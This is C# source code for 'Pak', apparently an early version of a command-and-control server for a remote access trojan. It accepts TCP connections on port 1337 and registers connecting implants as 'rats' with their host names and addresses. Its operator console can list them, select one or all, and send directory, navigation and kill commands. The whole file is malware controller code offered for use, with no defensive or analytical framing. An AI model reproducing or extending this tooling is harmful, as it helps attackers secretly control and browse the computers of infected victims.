using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;

/**
 * [ ] Have the option to communicate with either 1 or all connected clients.
 * [ ] Tasks ? for disconnected clients ?
 */

namespace da_pak
{
    class Pak
    {
        private static byte[] _buffer = new byte[2048];
        private static List<Socket> _clientSockets = new List<Socket>();
        private static List<Rat> _rats = new List<Rat>();
        private static Socket _serverSocket = new Socket
            (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        private static void puts(string text, bool prefix = true)
        {
            Console.WriteLine(text);
            if (prefix) Console.Write("> ");
        } private static void puts(){ puts(""); }

        private class Rat
        {
            public Socket hostSock;
            private string hostName;
            private string hostAddr;

            private static int n = 0;
            private static int ratN;
            public bool selected = false;

            public Rat(Socket sock, string info)
            {
                string[] infoArr = info.Split();                
                hostName = infoArr[1];
                hostAddr = infoArr[2];

                hostSock = sock;

                ratN = n;
                n += 1;
            }

            public override string ToString()
            {
                /*> Rat no.0: hostName on hostAddr */
                return "[" + selected + "] Rat no." + ratN + ": " + hostName + " on " + hostAddr;
            }
        }

        static void Main(string[] args)
        {
            Console.Title = "Pak";

            SetupServer();
            SendLoop();

            Console.WriteLine("Exiting...");
            Console.ReadLine();
        }

        private static void SetupServer()
        {
            Console.WriteLine("Setting up server...");
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, 1337));
            
            _serverSocket.Listen(5);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        private static void AcceptCallback(IAsyncResult AR)
        {
            Socket socket = _serverSocket.EndAccept(AR);

            _clientSockets.Add(socket);
            puts("Client connected...");
            
            socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
            
            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            
            try
            {
                int received = socket.EndReceive(AR);

                byte[] dataBuf = new byte[received];
                Array.Copy(_buffer, dataBuf, received);

                string text = Encoding.ASCII.GetString(dataBuf);

                /* RESPONSE */
                
                string response = string.Empty;
                if (text.ToLower().Split()[0] == "info")
                {
                    _rats.Add( new Rat(socket, text) );
                    response = "Rat added to the pak";
                    byte[] data = Encoding.ASCII.GetBytes(response);
                    socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                }

                socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
            }
            catch (SocketException)
            {
                puts("Client disconnected...");

                /** I could keep the rat and add a bool disconnected
                 * and handle the rat at a later time,
                 * but that is not in the scope of v0.1
                 */
                _clientSockets.Remove(socket);

                Rat toBeRemoved = null;
                foreach (var rat in _rats)
                    if (socket == rat.hostSock)
                        toBeRemoved = rat;
                if (_rats.Contains(toBeRemoved)) _rats.Remove(toBeRemoved);
            }
        }

        private static void SendCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            socket.EndSend(AR);
        }

        private static void SendMessage(string message, Rat rat)
        {
            byte[] data = Encoding.ASCII.GetBytes(message);
            rat.hostSock.BeginSend(data, 0, data.Length, SocketFlags.None,
                                new AsyncCallback(SendCallback), rat.hostSock);
            
            rat.hostSock.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
                                new AsyncCallback(ReceiveCallback), rat.hostSock);
        }

        private static string _help = @"
Commands:

list `or` rats          display clients

rat {no}                select a client to broadcast to
rat                     deselect client (broadcast to / select all)

dir                     display directory of the selected rat(s)
cd                      navigate the directory of the selected rat(s)

kill                    send terminate command to the selected rat(s)

help                    display help
break `or` exit         exit

";
        private static void SendLoop()
        {
            Rat theChosenOne = null;
            while(true)
            {
                Console.Write("> ");
                string input = Console.ReadLine().Trim();

                if (input == "break" || input == "exit")
                    break;

                else if (input == "help")
                    Console.Write(_help);

                else if (input == "list" || input == "rats")
                    foreach(var rat in _rats)
                        Console.WriteLine(rat);

                else if (input.Split()[0] == "rat" && input.Split().Length < 3)
                {
                    if (input.Split().Length == 1)
                        theChosenOne = null;
                    else if ( Convert.ToInt32(input.Split()[1]) < _rats.Count)
                    {
                        theChosenOne = _rats[ Convert.ToInt32(input.Split()[1]) ];
                        theChosenOne.selected = true;
                    }
                }

                /* Send message to either only one or to all rats */
                if (theChosenOne == null)
                    foreach(var rat in _rats)
                        SendMessage(input, rat);

                else
                {
                    SendMessage(input, theChosenOne);

                    if (input == "kill")
                        theChosenOne = null;
                }
            }
        }
    }
}
